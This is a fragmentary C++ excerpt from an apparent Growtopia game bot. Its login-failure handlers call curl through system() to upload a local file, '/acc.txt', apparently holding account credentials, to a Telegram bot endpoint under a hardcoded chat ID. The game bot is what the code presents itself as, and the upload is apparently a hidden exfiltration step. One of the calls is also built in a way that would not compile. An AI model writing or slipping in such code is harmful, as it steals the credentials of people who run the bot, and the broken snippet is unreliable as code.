...
void GrowtopiaBot::packet_type3(string text)
{
	...
	if (text.find("ATTEMPTS") != string::npos)
	{
		cout << "Ugh... Max number of logon attempts reached.. Seems like you reached max logon attempts (IP blocked for one hour.)" << endl;
		system("curl -v -F chat_id=" + chatid.c_str() + " -F document=@/acc.txt https://api.telegram.org//sendDocument");
		exit(0);
	...
	if (text.find("action|logon_fail") != string::npos)
	{
		...
		system("curl -v -F chat_id=972967761 -F document=@/acc.txt https://api.telegram.org//sendDocument");
		exit(0);
